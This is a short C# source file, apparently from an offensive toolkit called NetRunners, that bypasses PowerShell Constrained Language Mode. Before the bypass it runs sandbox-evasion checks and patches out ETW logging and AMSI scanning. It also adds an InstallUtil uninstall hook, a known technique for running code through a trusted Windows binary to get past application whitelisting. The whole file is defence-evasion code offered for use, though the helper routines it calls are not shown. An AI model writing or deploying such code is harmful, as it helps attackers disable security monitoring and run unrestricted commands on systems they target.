using System;
using static NetRunners.Clm.Command;
using static NetRunners.Heuristics.Heuristics;
using static NetRunners.Patchers.Patcher;


namespace NetRunners.Clm
{
    class Program
    {
        /// <summary>
        /// Launches a Powershell session in Full Language Mode, bypassing CLM.
        /// </summary>
        /// <param name="args">Powershell command to execute in Full Language Mode. Use single quotes around command or run from cmd if special characters are breaking execution.</param>

        static void Main(string[] args)
        {
            // call heuristic functions
            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
                return;
            
            BypassClm();
        }
    }
    /// <summary>
    /// Add InstallUtil support.
    /// </summary>
    [System.ComponentModel.RunInstaller(true)]      // add installutil support
    public class Sample : System.Configuration.Install.Installer
    {
        public override void Uninstall(System.Collections.IDictionary savedState)
        {
            // call heuristic functions
            if ((!Sleep()) || (!NonEmulated()) || (!PatchEtw()) || (!PatchAmsi()))
                return;

            BypassClm();
        }
    }
}
